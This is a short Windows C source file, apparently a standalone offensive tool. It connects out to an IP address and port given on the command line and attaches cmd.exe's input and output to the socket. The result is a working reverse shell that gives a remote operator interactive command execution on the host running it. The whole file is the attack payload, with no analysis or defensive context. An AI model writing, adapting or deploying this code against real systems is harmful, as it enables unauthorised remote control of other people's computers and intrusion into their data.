/**
 * RUBEN WIHLER
 * 10.6.2023
*/

#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>
#include <stdio.h>

#pragma comment(lib, "ws2_32.lib")

int main(int argc, char* argv[])
{
    SOCKET shell;
    sockaddr_in shell_addr;
    WSADATA wsa_data;
    STARTUPINFO startup_information;
    PROCESS_INFORMATION process_information;
    char RecvServer[512];
    int connection;
    char* SERVER_IP = "0.0.0.0";
    int PORT = 9001;

    if (argc != 3)
    {
        printf("format d'utilisation: %s <adresse ip> <port>\n", argv[0]);
        exit(1);
    }

    SERVER_IP = argv[1];
    PORT = atoi(argv[2]);

    if (PORT < 1 || PORT > 65535)
    {
        printf("[-] port invalide !\n");
        exit(1);
    }

    WSAStartup(MAKEWORD(2, 2), &wsa_data);
    shell = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);

    shell_addr.sin_family = AF_INET;
    shell_addr.sin_port = htons(PORT);
    shell_addr.sin_addr.s_addr = inet_addr(SERVER_IP);

    connection = WSAConnect(shell, (SOCKADDR*)&shell_addr, sizeof(shell_addr), NULL, NULL, NULL, NULL);
    if (connection == SOCKET_ERROR) {
        closesocket(shell);
        WSACleanup();
        exit(1);
    }

    recv(shell, RecvServer, sizeof(RecvServer), 0);
    memset(&startup_information, 0, sizeof(startup_information));
    startup_information.cb = sizeof(startup_information);
    startup_information.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
    startup_information.hStdInput = startup_information.hStdOutput = startup_information.hStdError = (HANDLE)shell;
    CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &startup_information, &process_information);
    
    WaitForSingleObject(process_information.hProcess, INFINITE);
    CloseHandle(process_information.hProcess);
    CloseHandle(process_information.hThread);

    memset(RecvServer, 0, sizeof(RecvServer));
    
    return TRUE;
}